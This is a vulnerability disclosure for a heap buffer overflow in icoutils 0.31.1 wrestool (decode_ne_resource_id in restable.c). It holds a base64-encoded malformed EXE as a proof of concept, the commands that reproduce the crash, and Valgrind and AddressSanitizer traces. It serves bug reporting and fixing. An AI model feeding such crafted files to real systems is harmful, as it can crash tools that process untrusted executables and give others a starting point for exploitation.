Machine: x86_64
OS: linux-gnu
Compiler: gcc
Compilation CFLAGS: "-ggdb3 -O0"
Machine Type: x86_64-unknown-linux-gnu
icoutils Version: 0.31.1
Release Status: release
Author: Jerzy Kramarz


Description:

A buffer overflow was observed in "decode_ne_resource_id" function in "restable.c" source file. This is happening because "len" parameter for memcpy operation is not checked for size and thus becomes negative integer in the process, resulting in failed memcpy operation. This issue can be triggered by processing a corrupted exe file and will result in wrestool crash. 


To replicate this issue use the attached sample below and execute the following command:

/home/ico-target/icoutils-0.31.1/wrestool/wrestool -l PoC.exe

PoC file (base64 encoded):

TkUAIAABAAh1c2VySQAAAAAAAAAAAAQAAAAAAAIACwFr//9/AQAAgAAAABAAAAAAAAAAIAAAAAAA
AAIAAAAAAA==


Repeat-By:
echo <above base64> > PoC.exe.b64
base64 -d PoC.exe.b64 > PoC.exe
/home/ico-target/icoutils-0.31.1/wrestool/wrestool -l PoC.exe


Valgrind Output: 

==13487== Memcheck, a memory error detector
==13487== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al.
==13487== Using Valgrind-3.10.0 and LibVEX; rerun with -h for copyright info
==13487== Command: /home/ico-target/icoutils-clean/wrestool/wrestool -l PoC.exe
==13487==
==13487== Invalid write of size 8
==13487==    at 0x402629: decode_ne_resource_id (restable.c:235)
==13487==    by 0x40287A: list_ne_type_resources (restable.c:338)
==13487==    by 0x40287A: list_resources (restable.c:365)
==13487==    by 0x402C28: do_resources_recurs (restable.c:80)
==13487==    by 0x402F2E: do_resources (restable.c:60)
==13487==    by 0x40189F: main (main.c:339)
==13487==  Address 0x51e1da7 is 9 bytes before a block of size 280 alloc'd
==13487==    at 0x4C28C20: malloc (vg_replace_malloc.c:296)
==13487==    by 0x406408: xmalloc (xmalloc.c:41)
==13487==    by 0x4027F4: list_ne_type_resources (restable.c:327)
==13487==    by 0x4027F4: list_resources (restable.c:365)
==13487==    by 0x402C28: do_resources_recurs (restable.c:80)
==13487==    by 0x402F2E: do_resources (restable.c:60)
==13487==    by 0x40189F: main (main.c:339)
==13487==
==13487== Invalid read of size 8
==13487==    at 0x40262E: decode_ne_resource_id (restable.c:235)
==13487==    by 0x40287A: list_ne_type_resources (restable.c:338)
==13487==    by 0x40287A: list_resources (restable.c:365)
==13487==    by 0x402C28: do_resources_recurs (restable.c:80)
==13487==    by 0x402F2E: do_resources (restable.c:60)
==13487==    by 0x40189F: main (main.c:339)
==13487==  Address 0x51e19da is 58 bytes inside a block of size 64 alloc'd
==13487==    at 0x4C28C20: malloc (vg_replace_malloc.c:296)
==13487==    by 0x406408: xmalloc (xmalloc.c:41)
==13487==    by 0x4017F9: main (main.c:315)
==13487==
==13487==
==13487== Process terminating with default action of signal 11 (SIGSEGV)
==13487==  Bad permissions for mapped region at address 0x55E0000
==13487==    at 0x40262E: decode_ne_resource_id (restable.c:235)
==13487==    by 0x40287A: list_ne_type_resources (restable.c:338)
==13487==    by 0x40287A: list_resources (restable.c:365)
==13487==    by 0x402C28: do_resources_recurs (restable.c:80)
==13487==    by 0x402F2E: do_resources (restable.c:60)
==13487==    by 0x40189F: main (main.c:339)
==13487==
==13487== HEAP SUMMARY:
==13487==     in use at exit: 1,752 bytes in 4 blocks
==13487==   total heap usage: 35 allocs, 31 frees, 5,455 bytes allocated
==13487==
==13487== LEAK SUMMARY:
==13487==    definitely lost: 0 bytes in 0 blocks
==13487==    indirectly lost: 0 bytes in 0 blocks
==13487==      possibly lost: 0 bytes in 0 blocks
==13487==    still reachable: 1,752 bytes in 4 blocks
==13487==         suppressed: 0 bytes in 0 blocks
==13487== Rerun with --leak-check=full to see details of leaked memory
==13487==
==13487== For counts of detected and suppressed errors, rerun with: -v
==13487== ERROR SUMMARY: 1046502 errors from 2 contexts (suppressed: 0 from 0)
Segmentation fault


ASAN Report (needs to compiled with -fsanitize=address):

==1056==ERROR: AddressSanitizer: unknown-crash on address 0x61200000bec0 at pc 0x40c433 bp 0x72ccfb544270 sp 0x72ccfb544268
WRITE of size 18446744073709551615 at 0x61200000bec0 thread T0
    #0 0x40c432 in decode_ne_resource_id /home/ico-target/icoutils-0.31.1/wrestool/restable.c:235
    #1 0x40c432 in list_ne_type_resources /home/ico-target/icoutils-0.31.1/wrestool/restable.c:338
    #2 0x40c432 in list_resources /home/ico-target/icoutils-0.31.1/wrestool/restable.c:365
    #3 0x40d550 in do_resources_recurs /home/ico-target/icoutils-0.31.1/wrestool/restable.c:80
    #4 0x40e758 in do_resources /home/ico-target/icoutils-0.31.1/wrestool/restable.c:60
    #5 0x403182 in main /home/ico-target/icoutils-0.31.1/wrestool/main.c:339
    #6 0x6e7fedb36b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
    #7 0x403f35 (/home/ico-target/icoutils-0.31.1/wrestool/wrestool+0x403f35)

0x61200000bec0 is located 0 bytes inside of 280-byte region [0x61200000bec0,0x61200000bfd8)
allocated by thread T0 here:
    #0 0x6e7fedf1473f in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.1+0x5473f)
    #1 0x42e290 in xmalloc /home/ico-target/icoutils-0.31.1/lib/xmalloc.c:41

SUMMARY: AddressSanitizer: unknown-crash /home/ico-target/icoutils-0.31.1/wrestool/restable.c:235 decode_ne_resource_id
Shadow bytes around the buggy address:
  0x0c247fff9780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff9790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff97a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff97b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff97c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c247fff97d0: fa fa fa fa fa fa fa fa[00]00 00 00 00 00 00 00
  0x0c247fff97e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c247fff97f0: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
  0x0c247fff9800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff9810: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c247fff9820: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Contiguous container OOB:fc
  ASan internal:           fe
==1056==ABORTING
